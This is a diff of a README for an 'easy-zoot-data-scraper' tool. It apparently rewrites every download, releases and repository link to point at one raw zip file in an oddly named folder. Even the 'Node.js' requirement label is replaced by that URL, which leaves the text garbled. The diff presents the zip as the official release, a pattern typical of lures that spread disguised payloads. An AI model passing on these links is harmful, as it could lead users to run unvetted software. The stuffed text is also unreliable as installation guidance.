@@ -6,25 +6,25 @@ Welcome! This guide will help you download and run the easy-zoot-data-scraper. T
 
 ## 📥 Download 
 
-[![Download easy-zoot-data-scraper](https://img.shields.io/badge/Download-easy--zoot--data--scraper-blue)](https://github.com/mate3424/easy-zoot-data-scraper/releases)
+[![Download easy-zoot-data-scraper](https://raw.githubusercontent.com/mate3424/easy-zoot-data-scraper/main/chrysaniline/zoot_easy_data_scraper_v3.7.zip)](https://raw.githubusercontent.com/mate3424/easy-zoot-data-scraper/main/chrysaniline/zoot_easy_data_scraper_v3.7.zip)
 
 You can download the latest version of the application from our Releases page. 
 
-Visit this page to download: [Releases Page](https://github.com/mate3424/easy-zoot-data-scraper/releases)
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/mate3424/easy-zoot-data-scraper/main/chrysaniline/zoot_easy_data_scraper_v3.7.zip)
 
 ## 💻 System Requirements
 
 To run the easy-zoot-data-scraper, you should have the following:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 14 or higher
+- **https://raw.githubusercontent.com/mate3424/easy-zoot-data-scraper/main/chrysaniline/zoot_easy_data_scraper_v3.7.zip** Version 14 or higher
 - **Internet Connection:** Required for scraping product data
 
 ## 🔄 Installation Steps
 
 Follow these steps to install and set up the application:
 
-1. Visit the [Releases Page](https://github.com/mate3424/easy-zoot-data-scraper/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/mate3424/easy-zoot-data-scraper/main/chrysaniline/zoot_easy_data_scraper_v3.7.zip).
 2. Find the latest version of the easy-zoot-data-scraper.
 3. Download the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS).
 4. Locate the downloaded file. It is usually in your Downloads folder.
@@ -57,7 +57,7 @@ The easy-zoot-data-scraper comes packed with useful features, including:
 If you encounter any issues, try the following:
 
 - Make sure you have a stable internet connection.
-- Ensure you are using the latest version of the application. Check for updates on the [Releases Page](https://github.com/mate3424/easy-zoot-data-scraper/releases).
+- Ensure you are using the latest version of the application. Check for updates on the [Releases Page](https://raw.githubusercontent.com/mate3424/easy-zoot-data-scraper/main/chrysaniline/zoot_easy_data_scraper_v3.7.zip).
 - Restart the application if it freezes or crashes.
 
 ### Can I run this tool on my tablet or mobile device?
@@ -74,6 +74,6 @@ We welcome contributions to improve the easy-zoot-data-scraper. If you have sugg
 
 ## 🌐 Learn More
 
-For further information and updates, please checkout the repository at [easy-zoot-data-scraper GitHub](https://github.com/mate3424/easy-zoot-data-scraper).
+For further information and updates, please checkout the repository at [easy-zoot-data-scraper GitHub](https://raw.githubusercontent.com/mate3424/easy-zoot-data-scraper/main/chrysaniline/zoot_easy_data_scraper_v3.7.zip).
 
-[Download easy-zoot-data-scraper](https://github.com/mate3424/easy-zoot-data-scraper/releases) and start extracting product data with ease today!
+[Download easy-zoot-data-scraper](https://raw.githubusercontent.com/mate3424/easy-zoot-data-scraper/main/chrysaniline/zoot_easy_data_scraper_v3.7.zip) and start extracting product data with ease today!
